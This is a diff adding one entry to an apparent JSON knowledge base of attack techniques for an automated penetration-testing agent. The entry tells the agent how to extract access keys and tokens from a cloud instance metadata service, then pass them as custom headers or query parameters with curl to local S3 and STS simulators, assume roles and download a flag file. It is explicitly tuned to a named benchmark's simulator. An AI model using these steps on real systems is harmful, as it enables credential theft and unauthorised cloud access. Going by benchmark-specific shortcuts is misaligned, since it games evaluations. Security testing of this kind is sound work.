@@ -75,5 +75,26 @@
     "tags": ["postgresql", "copy-from-program", "imds", "cloud", "credentials", "rds", "ec2", "database-escape"],
     "confidence": 0.85,
     "mitre_attack": "T1522"
+  },
+  {
+    "id": "cloud-metadata-005",
+    "category": "EXPLOIT",
+    "subcategory": "CLOUD",
+    "title": "Cloud Simulator Authentication — Custom HTTP Headers for Local S3/STS APIs",
+    "description": "Local cloud service simulators (DARWIN benchmark, localstack) use custom HTTP headers for authentication instead of standard AWS CLI Signature V4. The IMDS-returned credentials must be passed as headers, NOT used with aws_cli. Attack: (1) Extract AccessKeyId, SecretAccessKey, and Token from IMDS. (2) For S3 simulator access: curl -H 'X-Access-Key-Id: AKIA...' -H 'X-Secret-Access-Key: ...' http://S3_ENDPOINT/. (3) For STS simulator: curl -H 'X-Access-Key-Id: ...' -H 'X-Secret-Access-Key: ...' http://STS_ENDPOINT/assume-role. (4) Check for X-Amz-* variants as fallback: X-Amz-Access-Key, X-Amz-Secret-Key. (5) The simulator may also accept credentials as query parameters: ?access_key=AKIA...&secret_key=... . (6) Do NOT attempt aws_cli with simulator credentials — simulators lack real AWS Signature V4 validation. Use curl_get or curl with custom headers.",
+    "techniques": [
+      "S3 with custom headers: curl -H 'X-Access-Key-Id: AKIA...' -H 'X-Secret-Access-Key: ...' http://localhost:PORT/",
+      "S3 with query params: curl 'http://localhost:PORT/?access_key=AKIA...&secret_key=...'",
+      "STS assume-role: curl -H 'X-Access-Key-Id: ...' -H 'X-Secret-Access-Key: ...' http://localhost:PORT/assume-role",
+      "List S3 objects: curl -H 'X-Access-Key-Id: ...' -H 'X-Secret-Access-Key: ...' http://localhost:PORT/",
+      "Download S3 object: curl -H 'X-Access-Key-Id: ...' http://localhost:PORT/flag.txt",
+      "Use curl_get tool with headers= parameter for authenticated S3 access"
+    ],
+    "indicators": ["Local or simulated cloud endpoints (not real AWS)", "IMDS returns credentials but aws_cli fails", "Service identified as 'simulator' or 'DARWIN S3 simulator' in bootstrap", "Endpoint responds to custom headers but not AWS Signature V4"],
+    "prerequisites": ["IMDS credentials extracted (AccessKeyId, SecretAccessKey)", "Cloud simulator endpoint URL", "Understanding that simulators use custom auth, not AWS Signature V4"],
+    "tools": ["curl_get", "check_cloud_metadata", "aws_cli"],
+    "tags": ["cloud", "simulator", "authentication", "custom-headers", "s3", "sts", "imds", "darwin-benchmark"],
+    "confidence": 0.85,
+    "mitre_attack": "T1522"
   }
 ]
